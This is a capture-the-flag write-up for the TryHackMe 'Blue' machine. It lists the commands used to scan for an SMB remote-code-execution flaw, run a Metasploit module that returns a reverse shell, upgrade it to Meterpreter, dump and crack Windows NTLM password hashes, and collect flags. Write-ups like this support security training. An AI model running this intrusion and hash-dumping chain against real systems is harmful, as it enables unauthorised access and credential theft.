# Blue - Enumeration & Exploitation

## Machine Information

- Target Machine: `Blue`
- Platform: TryHackMe
- Connected to the target environment using the TryHackMe OpenVPN configuration.

![TryHackMe Machine](../Screenshots/blue_tryhackme-1.png)

---

## Initial Nmap Scan

```bash
sudo nmap <TARGET-IP> -sC -sV -T4
```

- Performed an initial service enumeration scan against the target system.
- Identified SMB services running on the target machine.
- Collected service versions and default script scan results for further analysis.

![Nmap Scan](../Screenshots/nmapscan-2.png)

---

## SMB NSE Script Enumeration

```bash
sudo ls -la /usr/share/nmap/scripts/ | grep -e smb
```

- Enumerated available SMB-related NSE scripts included with Nmap.
- Identified useful scripts that could be used to check for SMB vulnerabilities.

![SMB NSE Scripts](../Screenshots/flitersmbnmapscripts-3.png)

---

## Vulnerability Discovery

- Executed SMB vulnerability detection scripts against the target system.
- Confirmed the target was vulnerable to a known SMB Remote Code Execution vulnerability.

![Vulnerability Discovery](../Screenshots/foundvulnerabilty-4.png)

---

## Exploit Research

```bash
msfconsole
```

- Researched publicly available exploits related to the identified SMB vulnerability.
- Located a compatible exploit module within the Metasploit Framework.

![Exploit Discovery](../Screenshots/foundexploit-5.png)

---

## Exploit Configuration

```bash
show options
```

```bash
set RHOSTS <TARGET-IP>
set LHOST <TRYHACKME-VPN-IP>
```

- Configured the exploit module with the target IP address.
- Set the local host to the TryHackMe VPN IP address to receive the reverse connection.

![Exploit Configuration](../Screenshots/shouldsetrhosts-6.png)

---

## Initial Shell Access

```bash
run
```

- Executed the exploit successfully.
- Obtained a remote shell on the target Windows machine.

![Initial Shell](../Screenshots/gotashell-7.png)

---

## Upgrading to Meterpreter

```bash
search shell_to_meterpreter
```

- Searched for the shell upgrade module inside Metasploit.
- Upgraded the standard shell to a Meterpreter session for advanced post-exploitation functionality.

![Shell to Meterpreter](../Screenshots/shelltometerpreter-8.png)

---

## System Enumeration

```bash
sysinfo
```

```bash
shell
```

- Gathered operating system information using Meterpreter.
- Spawned a Windows command shell for additional enumeration.

![System Enumeration](../Screenshots/windows_shell-9.png)

---

## Process Migration Attempts

```bash
migrate 3016
```

```bash
migrate 3044
```

- Attempted to migrate the Meterpreter session into different running processes.
- Migration attempts were denied due to insufficient permissions.

![Process Migration](../Screenshots/trytomigrate-10.png)

---

## Password Hash Dumping

```bash
hashdump
```

- Dumped local Windows password hashes from the target system.
- Identified multiple user accounts and their NTLM password hashes.

![Hash Dump](../Screenshots/dumphashes-11.png)

---

## Preparing Hashes for Cracking

- Identified the user account `Jon`.
- Saved Jon's NTLM hash into a file named:

```text
hashes.txt
```

- Prepared the hash for offline password cracking.

![Hash Preparation](../Screenshots/rootuserhashinatxtfile-12.png)

---

## Password Cracking

```bash
sudo john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

- Used John the Ripper to crack the NTLM password hash.
- Successfully recovered the plaintext password associated with the user account.

![Password Cracked](../Screenshots/foundpasswrdfromhashofjon-13.png)

---

## Flag 1 Discovery

```cmd
cd C:\
dir
```

- Enumerated the root of the C drive.
- Located and retrieved the first flag.

![Flag 1](../Screenshots/foundflag1-14.png)

---

## Flag 3 Discovery

```cmd
cd C:\Users\Jon\Documents
dir
```

- Navigated to Jon's Documents directory.
- Located and retrieved the third flag.

![Flag 3](../Screenshots/foundflag3-15.png)

---

## Searching for Flag 2

```bash
search -f flag2.txt
```

- Used Meterpreter's search functionality to locate the second flag.
- Retrieved the full file path of the target file.

![Searching for Flag 2](../Screenshots/searchforflag2-16.png)

---

## Flag 2 Discovery

- Navigated to the discovered location.
- Retrieved the second flag successfully.

![Flag 2](../Screenshots/foundflag2-17.png)
